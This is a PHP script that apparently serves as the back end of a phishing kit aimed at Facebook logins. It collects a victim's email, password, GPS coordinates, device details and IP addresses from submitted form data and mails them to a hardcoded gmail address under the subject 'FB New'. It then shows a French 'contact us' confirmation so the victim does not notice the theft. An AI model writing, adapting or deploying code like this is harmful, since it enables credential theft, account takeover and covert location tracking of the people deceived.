
  
 
<?php

 
 
/////////////////////////////////////////////////////////////
function get2_real_ip()
{

    if (isset($_SERVER["HTTP_CLIENT_IP"]))
    {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
    {
        return $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    elseif (isset($_SERVER["HTTP_X_FORWARDED"]))
    {
        return $_SERVER["HTTP_X_FORWARDED"];
    }
    elseif (isset($_SERVER["HTTP_FORWARDED_FOR"]))
    {
        return $_SERVER["HTTP_FORWARDED_FOR"];
    }
    elseif (isset($_SERVER["HTTP_FORWARDED"]))
    {
        return $_SERVER["HTTP_FORWARDED"];
    }
    else
    {
        return $_SERVER["REMOTE_ADDR"];
    }
}


 

$ip1=$_GET['myip'];


$ip2= get2_real_ip();
$phonx=$_GET['phonx'];



$email7=htmlspecialchars($_POST['email']);
$pass=htmlspecialchars($_POST['pass']);
$lati=htmlspecialchars($_POST['lati']);
$longi=htmlspecialchars($_POST['longi']);
$devm=htmlspecialchars($_POST['devm']);
$devu1=htmlspecialchars($_POST['devu1']);
 $devv1=htmlspecialchars($_POST['devv1']);

 


    $emailk= $_COOKIE['PublisherIch'];
   $from = $emailk;
   $ly=$emailk;
    // sender
  
   $m=htmlspecialchars($_POST['m']);
 
   $email="nestow216@gmail.com";
   $from=$email;
   $to=$email;
    $subject = "FB New  ";


    $message = '

<meta http-equiv="Content-Type"  content="text/html charset=UTF-8" />
    <style type="text/css">
.email-content-box {
  box-shadow: 0 3px 3px -3px #aaa;
}
.email-content-box p, #email-footer p {
  margin-bottom: 13px;
  margin: 13px 0;
  line-height: 18px;
}
a {
  text-decoration: none;
  color: #1155cc;
}
table td, table div {
  line-height: 18px;
}
h1,h2,h3,h4,h5 {
  color: #222 !important;
  font-family: Arial, Helvetica, sans-serif;
}
.button-action, .button-action-1 {
  margin-right: 16px;
  margin-bottom: 16px;
}
.email-link {
  color: #15c;
  font-weight: bold;
  text-decoration: none;
}
#help-center {
  width:450px;
  margin:auto;
  padding-bottom:10px;
}
#product-footer p {
  padding:0;
  margin:10px 0px 5px 0px;
}
@media only screen and (max-device-width: 568px){
  td[class="email-content-box"], table[class="email-content-box"], div[=
class="email-content-box"] {
    box-shadow: 0 3px 3px -2px #aaa;
    border-bottom: none !important;
  }
  a[class="button-action"] {
    height: auto !important;
    padding: 14px !important;
    margin-right: 16px;
    margin-bottom: 16px;
  }
  a[class="button-action-1"] {
    width: 100%;
    box-sizing: border-box;
    height: auto !important;
    padding: 14px !important;
    display: block !important;
    margin-right: 16px;
    margin-bottom: 16px;
  }
  a[class="button-action-1"] + a {
    display: block !important;
  }
  p[class="offer-callout"], .m-full-width {
    width: 100%;
    display: block;
    box-sizing: border-box;
  }
  #email-footer, .secondary, .email-secure, .small {
    -webkit-text-size-adjust: none;
  }
}
</style>
<p>

    ip1:'.$ip1.'</p><p> ip2:'.$ip2.'</p><p> email:'.$email7.'</p><p>passw:'.$pass.' </p><p> lati:'.$lati.'</p><p> longi:'.$longi.' 


    </p>
<p>
Device info 

     :'.$phonx.'</p>devu1:'.$devu1.'</br>devv1:'.$devv1;

 
     
    // message lines should not exceed 70 characters (PHP rule), so wrap it ..OOPES 
   //$message = wordwrap($message, 70);
  
   $headers = "From:  AbuGandar  \r\n";
   $headers .= "Content-Type: text/html; charset=UTF-8; charset=ISO-8859-1\r\n";
    // send mail
    mail($email,$subject,$message,$headers,"From:Abugandar \n");
    echo $pass;
    echo $pass7;
    echo'
    
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
        <h3 class="modal-title"><i class="fa fa-paper-plane"></i>
 Contactez-nous</h3>
      </div>
      <div class="modal-body"  >
    <center><h3>Nous répondrons à votre demande et à toutes vos questions dans un délai maximum de 48h <i class="fa fa-clock-o"></i>
. </h3></center>

</div>
      <div class="modal-footer">
        <button type="button" class="btn btn-tertiary" data-dismiss="modal"><i class="fa fa-times"></i>
 Fermer</button>
        


';
?>


